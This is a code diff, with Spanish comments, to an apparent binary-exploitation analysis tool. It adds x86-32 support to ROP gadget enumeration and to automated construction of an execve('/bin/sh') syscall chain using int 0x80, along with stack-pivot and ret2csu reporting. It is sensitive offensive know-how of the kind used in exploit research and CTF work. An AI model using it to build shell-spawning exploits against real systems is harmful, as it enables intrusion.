@@ -26,7 +26,27 @@ _re_csu_addr = _re_mod.compile(r"^(?:\|[\s`\-]*)?(0x[0-9a-fA-F]+)\b")
 
 # registros de argumentos SysV x86-64 (orden de llamada) + los relevantes para syscalls
 _ARG_REGS = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
+# x86-32 Linux: los argumentos de SYSCALL van en ebx, ecx, edx, esi, edi, ebp (no en la pila como
+# las llamadas de funcion cdecl). execve es el syscall 11 (no 59) y se invoca con `int 0x80`.
+_ARG_REGS_32 = ["ebx", "ecx", "edx", "esi", "edi", "ebp"]
 _SYS_EXECVE = 0x3b
+_SYS_EXECVE_32 = 0x0b
+
+
+def _is32(arch_or_bits) -> bool:
+    """True si es x86 de 32 bits. Acepta la cadena arch ('x86_32') o un entero de bits."""
+    if isinstance(arch_or_bits, int):
+        return arch_or_bits == 32
+    return str(arch_or_bits or "").strip().endswith("32")
+
+
+def _arg_regs(bits: int) -> List[str]:
+    return _ARG_REGS_32 if bits == 32 else _ARG_REGS
+
+
+def _acc(bits: int) -> str:
+    """Registro acumulador para el numero de syscall (eax en 32b, rax en 64b)."""
+    return "eax" if bits == 32 else "rax"
 
 # tipos de opcode que rompen un gadget limpio si aparecen antes del terminador
 _BRANCHY = {"cjmp", "jmp", "ujmp", "call", "ucall", "rcall", "ccall", "invalid", "ill"}
@@ -113,14 +133,18 @@ def _classify(raw: dict) -> Optional[Gadget]:
         return None
     last = ops[-1]
     lt = last.get("type", "")
-    if lt not in ("ret", "syscall") and "ret" not in last.get("opcode", ""):
+    _last_op = last.get("opcode", "") or ""
+    # terminadores validos: ret, syscall, e `int 0x80` (syscall de 32-bit; r2 lo tipa 'swi'/'int')
+    if lt not in ("ret", "syscall") and "ret" not in _last_op and "int 0x80" not in _last_op:
         return None
     sets, clobbers, side, moves = [], [], [], []
     mem_write = ""
-    stack_delta = 8 if lt == "ret" else 0   # el ret consume la direccion de retorno
+    pop_count = 0
+    extra_delta = 0                         # bytes de add/sub rsp|esp (absolutos, no por palabra)
     _GPR = {"rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp", "rsp",
             "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
             "eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"}
+    _REG32 = {"eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"}
     for op in ops[:-1]:
         t = op.get("type", "")
         txt = (op.get("opcode", "") or "").strip()
@@ -137,11 +161,11 @@ def _classify(raw: dict) -> Optional[Gadget]:
         if mn == "pop" and len(parts) >= 2:
             reg = parts[1]
             sets.append(reg)
-            stack_delta += 8
-        elif mn in ("add", "sub") and len(parts) >= 3 and parts[1] == "rsp":
+            pop_count += 1
+        elif mn in ("add", "sub") and len(parts) >= 3 and parts[1] in ("rsp", "esp"):
             try:
                 delta = int(parts[2], 0)
-                stack_delta += delta if mn == "add" else -delta
+                extra_delta += delta if mn == "add" else -delta
             except ValueError:
                 pass
             side.append(txt)
@@ -153,20 +177,28 @@ def _classify(raw: dict) -> Optional[Gadget]:
             # mov regA, regB: fija regA desde otro registro (util cuando no hay `pop regA`)
             moves.append(f"{lhs_reg}<-{rhs_reg}")
             clobbers.append(lhs_reg)
-        elif mn == "xchg" and ("rsp" in lhs or "rsp" in rhs):
-            side.append(f"{txt}: pivote de stack (xchg con rsp)")
-        elif mn in ("mov", "xor", "lea", "add", "sub", "inc", "dec", "and", "or") and lhs_reg:
+        elif mn == "xchg" and ("rsp" in (lhs, rhs) or "esp" in (lhs, rhs)):
+            side.append(f"{txt}: pivote de stack (xchg con el puntero de pila)")
+        elif mn in ("mov", "xor", "lea", "add", "sub", "inc", "dec", "and", "or") \
+                and lhs_reg in _GPR and "[" not in lhs:
             clobbers.append(lhs_reg)
         elif mn == "leave":
             side.append("leave (rsp<-rbp; pop rbp): pivote de stack")
         elif t not in _BENIGN:
             side.append(txt)
+    # ancho de palabra: si TODOS los registros popeados son de 32 bits, la pila usa slots de 4B
+    # (x86-32); si no, 8B (x86-64). Determina el stack delta real.
+    word = 4 if (sets and all(r in _REG32 for r in sets)) else 8
+    stack_delta = (pop_count + (1 if lt == "ret" else 0)) * word + extra_delta
     kind = "ret"
     joined = " ".join((o.get("opcode", "") or "") for o in ops)
     if "syscall" in joined or "int 0x80" in joined:
         kind = "syscall"
-    elif ("leave" in joined or any("pop rsp" in (o.get("opcode", "") or "") for o in ops)
-          or any("xchg" in (o.get("opcode", "") or "") and "rsp" in (o.get("opcode", "") or "")
+    elif ("leave" in joined
+          or any(("pop rsp" in (o.get("opcode", "") or "") or "pop esp" in (o.get("opcode", "") or ""))
+                 for o in ops)
+          or any("xchg" in (o.get("opcode", "") or "")
+                 and ("rsp" in (o.get("opcode", "") or "") or "esp" in (o.get("opcode", "") or ""))
                  for o in ops)):
         kind = "pivot"
     elif sets:
@@ -337,15 +369,19 @@ def _best_for(gadgets: List[Gadget], reg: str) -> Optional[Gadget]:
                                         len(g.sets)))[0]
 
 
-def _build_arsenal(gadgets: List[Gadget]) -> dict:
+def _build_arsenal(gadgets: List[Gadget], bits: int = 64) -> dict:
     """Resumen tecnico del arsenal ROP: mejor gadget para cada rol clave (arg regs, syscall,
     pivote, write-what-where, movimientos reg-a-reg). Objetivo: que el razonamiento ROP quede
-    reflejado explicitamente en el informe, no solo enterrado en las cadenas."""
+    reflejado explicitamente en el informe, no solo enterrado en las cadenas. Arch-aware: en 32b
+    los registros de syscall son ebx/ecx/edx/eax y el syscall es `int 0x80`."""
     def _g(g):
         return {"addr": hex(g.addr), "text": g.text, "delta": g.stack_delta,
                 "clobbers": g.clobbers}
-    arsenal = {"arg_regs": {}, "syscall": None, "pivot": None, "write": None, "moves": []}
-    for reg in _ARG_REGS + ["rax"]:
+    aregs = _arg_regs(bits)
+    acc = _acc(bits)
+    arsenal = {"arg_regs": {}, "syscall": None, "pivot": None, "write": None, "moves": [],
+               "bits": bits}
+    for reg in aregs + [acc]:
         g = _best_for(gadgets, reg)
         if g:
             arsenal["arg_regs"][reg] = _g(g)
@@ -364,8 +400,9 @@ def _build_arsenal(gadgets: List[Gadget]) -> dict:
         for mv in g.moves:
             arsenal["moves"].append({"move": mv, "addr": hex(g.addr), "text": g.text})
     arsenal["moves"] = arsenal["moves"][:12]
-    # cobertura: cuantos de los 3 primeros arg regs + rax + syscall tenemos (lo que execve necesita)
-    need = ["rdi", "rsi", "rdx", "rax"]
+    # cobertura execve-por-syscall: los 3 primeros arg regs + acumulador + el gadget de syscall
+    # (rdi/rsi/rdx/rax+syscall en 64b; ebx/ecx/edx/eax+int0x80 en 32b)
+    need = aregs[:3] + [acc]
     have = [r for r in need if r in arsenal["arg_regs"]]
     arsenal["execve_coverage"] = {"have": have, "need": need,
                                   "syscall": arsenal["syscall"] is not None,
@@ -378,7 +415,7 @@ def _full_arsenal(binary: str, gadgets: List[Gadget], f: dict) -> dict:
     """Arsenal base (_build_arsenal) enriquecido con las tecnicas que requieren el binario:
     ret2csu (gadgets universales de __libc_csu_init) y one_gadget (magic gadgets de libc estatica
     embebida). Compartido por analyze_chains y analyze_arsenal."""
-    arsenal = _build_arsenal(gadgets)
+    arsenal = _build_arsenal(gadgets, bits=(32 if _is32(f.get("arch")) else 64))
     try:
         csu = _detect_ret2csu(binary)
         if csu:
@@ -394,9 +431,10 @@ def _full_arsenal(binary: str, gadgets: List[Gadget], f: dict) -> dict:
     return arsenal
 
 
-def _enum_gadgets(binary: str) -> List[Gadget]:
+def _enum_gadgets(binary: str, bits: int = 64) -> List[Gadget]:
     """Enumera y clasifica gadgets reales del binario con radare2 (`/Rj`). Busca patrones utiles
-    para control de registros de argumentos, syscall y pivote. Best-effort; [] si no hay r2."""
+    para control de registros de argumentos, syscall y pivote. Arch-aware: en 32b busca pops de
+    ebx/ecx/edx/eax e `int 0x80`; en 64b, rdi/rsi/rdx/rax y `syscall`. Best-effort; [] si no hay r2."""
     out: List[Gadget] = []
     seen = set()
     try:
@@ -419,11 +457,21 @@ def _enum_gadgets(binary: str) -> List[Gadget]:
         # required gadget unfound and silently skip verification. Previously all six arg-reg scans
         # (incl. rcx/r8/r9, which no chain needs) ran before `syscall`, so under load the 40s budget
         # was spent before `syscall` was ever scanned -> unmet_requirements=1 -> "no simulada".
-        essential = ["pop " + reg for reg in _ARG_REGS[:3]] + ["pop rax", "syscall"]  # rdi,rsi,rdx,rax,syscall
-        optional = (["pop " + reg for reg in _ARG_REGS[3:]]       # rcx,r8,r9: extra arg regs (6+ arg calls)
-                    + ["int 0x80", "leave"]                        # 32-bit syscall / stack pivot
-                    + ["pop " + reg for reg in ("rbx", "rbp", "rsp")]
-                    + ["mov qword", "mov dword", "xchg"])          # write-what-where / xchg-rsp pivot
+        aregs = _arg_regs(bits)
+        acc = _acc(bits)
+        if bits == 32:
+            # x86-32: syscall args en ebx/ecx/edx, numero en eax, invocacion `int 0x80`
+            essential = ["pop " + r for r in aregs[:3]] + ["pop " + acc, "int 0x80"]
+            optional = (["pop " + r for r in aregs[3:]]            # esi,edi,ebp
+                        + ["syscall", "leave"]                      # syscall (raro en 32b) / pivote
+                        + ["pop ebx", "pop ebp", "pop esp"]
+                        + ["mov dword", "xchg"])                    # write-what-where / xchg-esp pivot
+        else:
+            essential = ["pop " + reg for reg in aregs[:3]] + ["pop " + acc, "syscall"]  # rdi,rsi,rdx,rax,syscall
+            optional = (["pop " + reg for reg in aregs[3:]]        # rcx,r8,r9: extra arg regs (6+ arg calls)
+                        + ["int 0x80", "leave"]                     # 32-bit syscall / stack pivot
+                        + ["pop " + reg for reg in ("rbx", "rbp", "rsp")]
+                        + ["mov qword", "mov dword", "xchg"])       # write-what-where / xchg-rsp pivot
         deadline = _time.time() + budget_s
         for pat in essential + optional:
             if pat not in essential and _time.time() > deadline:
@@ -740,7 +788,8 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
                  "(GOT/PLT, tcache, execve, '/bin/sh' strings) are glibc-specific and have no "
                  "equivalent here.")
         return ChainAnalysis(arch=f["arch"], applicable=False, note=note)
-    gadgets = _enum_gadgets(binary)
+    _bits = 32 if _is32(f.get("arch")) else 64
+    gadgets = _enum_gadgets(binary, bits=_bits)
     _arsenal = _full_arsenal(binary, gadgets, f)
     an = ChainAnalysis(arch=f["arch"], gadgets=gadgets, arsenal=_arsenal)
     # bad-chars gobernados por el sink de entrada (no-PIE: direcciones fijas comprobables)
@@ -867,24 +916,29 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
         c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2libc", f, lang)
     chains.append(c)
 
-    # 3) execve por syscall: pop rax=59; pop rdi=&/bin/sh; pop rsi=0; pop rdx=0; syscall
+    # 3) execve por syscall. 64b: pop rax=59; pop rdi=&/bin/sh; pop rsi=0; pop rdx=0; syscall.
+    #    32b: pop eax=11; pop ebx=&/bin/sh; pop ecx=0; pop edx=0; int 0x80.
+    _a3 = _arg_regs(_bits)[:3]              # (rdi,rsi,rdx) o (ebx,ecx,edx)
+    _accr = _acc(_bits)                     # rax o eax
+    _syscall_insn = "int 0x80" if _bits == 32 else "syscall"
+    _execve_num = _SYS_EXECVE_32 if _bits == 32 else _SYS_EXECVE
+    _order = [_accr] + _a3                  # el acumulador (numero) + los 3 args
     c = ExploitChain(name="execve syscall", target="execve('/bin/sh',0,0)")
-    need = {"rax": _best_for(gadgets, "rax"), "rdi": _best_for(gadgets, "rdi"),
-            "rsi": _best_for(gadgets, "rsi"), "rdx": _best_for(gadgets, "rdx")}
+    need = {rn: _best_for(gadgets, rn) for rn in _order}
     g_sys = next((g for g in gadgets if g.kind == "syscall"), None)
     has_binsh = f.get("binsh") is not None
     c.requirements = [_req(rip, "control de RIP", "RIP control", lang)]
-    for rname in ("rax", "rdi", "rsi", "rdx"):
+    for rname in _order:
         c.requirements.append(_req(bool(need[rname]), f"gadget `pop {rname}; ret`", f"gadget `pop {rname}; ret`", lang))
-    c.requirements.append(_req(bool(g_sys), "gadget `syscall`", "gadget `syscall`", lang))
+    c.requirements.append(_req(bool(g_sys), f"gadget `{_syscall_insn}`", f"gadget `{_syscall_insn}`", lang))
     c.requirements.append(_req(has_binsh, "cadena '/bin/sh' (o escribible en .bss)",
                                "'/bin/sh' string (or writable in .bss)", lang))
-    c.regs_needed = ["rax", "rdi", "rsi", "rdx"]
+    c.regs_needed = list(_order)
     c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
     c.gadgets_used = [g.addr for g in list(need.values()) + [g_sys] if g]
     # RAZONAMIENTO arsenal -> cadena: conecta lo detectado en el arsenal (ret2csu, one_gadget) con
-    # los huecos de esta cadena execve-por-syscall (pops de rsi/rdx que falten) como vias alternativas.
-    _missing_args = [r for r in ("rsi", "rdx") if not need[r]]
+    # los huecos de esta cadena execve-por-syscall (pops de los 2 ultimos args que falten).
+    _missing_args = [r for r in _a3[1:] if not need[r]]
     for note_es, note_en in _execve_arsenal_notes(_missing_args, _arsenal):
         c.constraints.append(L(note_es, note_en))
     for rname, g in need.items():
@@ -895,9 +949,9 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
                                        f"clobber conflict in pop {rname}: destroys {', '.join(other)}"))
     c.steps = [ChainStep("vuln", ovf),
                ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")})]
-    vals = {"rax": L("59 (execve)", "59 (execve)"), "rdi": "&'/bin/sh'", "rsi": "0", "rdx": "0"}
+    vals = {_accr: f"{_execve_num} (execve)", _a3[0]: "&'/bin/sh'", _a3[1]: "0", _a3[2]: "0"}
     setregs = {}
-    for rname in ("rax", "rdi", "rsi", "rdx"):
+    for rname in _order:
         g = need[rname]
         setregs = dict(setregs); setregs[rname] = vals[rname]
         c.steps.append(ChainStep("gadget", f"pop {rname}; ret", g.text if g else L("AUSENTE", "ABSENT"),
@@ -905,7 +959,7 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
                                  stack=f"delta={g.stack_delta}B" if g else "",
                                  constraints=((g.side_effects or L("limpio", "clean")) if g
                                               else L("gadget ausente", "gadget absent"))))
-    c.steps.append(ChainStep("target", "syscall -> execve", g_sys.text if g_sys else L("syscall AUSENTE", "syscall ABSENT"),
+    c.steps.append(ChainStep("target", f"{_syscall_insn} -> execve", g_sys.text if g_sys else L("syscall AUSENTE", "syscall ABSENT"),
                              addr=g_sys.addr if g_sys else None, regs=dict(setregs)))
     _apply_badchars(c, [g.addr for g in list(need.values()) + [g_sys] if g]
                     + ([f["binsh"]] if f.get("binsh") else []), _badset, _sink, lang)
@@ -1263,7 +1317,7 @@ def analyze_arsenal(binary: str, reg=None, lang: str = "es") -> dict:
                          f"({f.get('arch','?')}), no ELF/Linux x86" if lang == "es" else
                          f"ROP arsenal not applicable: {f.get('bintype')} "
                          f"({f.get('arch','?')}) binary, not ELF/Linux x86")}
-    gadgets = _enum_gadgets(binary)
+    gadgets = _enum_gadgets(binary, bits=(32 if _is32(f.get("arch")) else 64))
     arsenal = _full_arsenal(binary, gadgets, f)
     return {"ok": True, "applicable": True, "arch": f.get("arch"),
             "static": f.get("static"), "pie": f.get("pie"), "arsenal": arsenal}
@@ -1277,12 +1331,14 @@ def render_arsenal(r: dict, lang: str = "es") -> str:
     if not r.get("applicable"):
         return "\n".join(out + ["- " + (r.get("note") or "no aplicable")])
     ars = r.get("arsenal") or {}
+    _b = ars.get("bits", 64)
+    _order = _arg_regs(_b) + [_acc(_b)]
     out.append(f"- arquitectura: {r.get('arch')}  |  estatico: {r.get('static')}  |  PIE: {r.get('pie')}")
     out.append(f"- gadgets clasificados: {ars.get('total_gadgets', 0)}")
     argregs = ars.get("arg_regs") or {}
     if argregs:
-        out.append("\n### Control de registros (SysV: rdi, rsi, rdx, rcx, r8, r9, rax)")
-        for rg in ("rdi", "rsi", "rdx", "rcx", "r8", "r9", "rax"):
+        out.append(f"\n### Control de registros ({'syscall x86-32: ebx, ecx, edx, esi, edi, eax' if _b == 32 else 'SysV x86-64: rdi, rsi, rdx, rcx, r8, r9, rax'})")
+        for rg in _order:
             g = argregs.get(rg)
             if g:
                 cl = (" | clobbers: " + ", ".join(g["clobbers"])) if g.get("clobbers") else ""
@@ -1302,7 +1358,8 @@ def render_arsenal(r: dict, lang: str = "es") -> str:
     if cov:
         mark = "COMPLETA" if cov.get("complete") else \
             f"parcial (tiene: {', '.join(cov.get('have') or []) or 'ninguno'})"
-        out.append(f"\n### Cobertura execve-por-syscall (rdi/rsi/rdx/rax + syscall): **{mark}**")
+        _needtxt = "/".join(cov.get("need") or []) + ("+int0x80" if _b == 32 else "+syscall")
+        out.append(f"\n### Cobertura execve-por-syscall ({_needtxt}): **{mark}**")
     csu = ars.get("ret2csu")
     if csu:
         out.append(f"\n### ret2csu (gadget universal __libc_csu_init)")
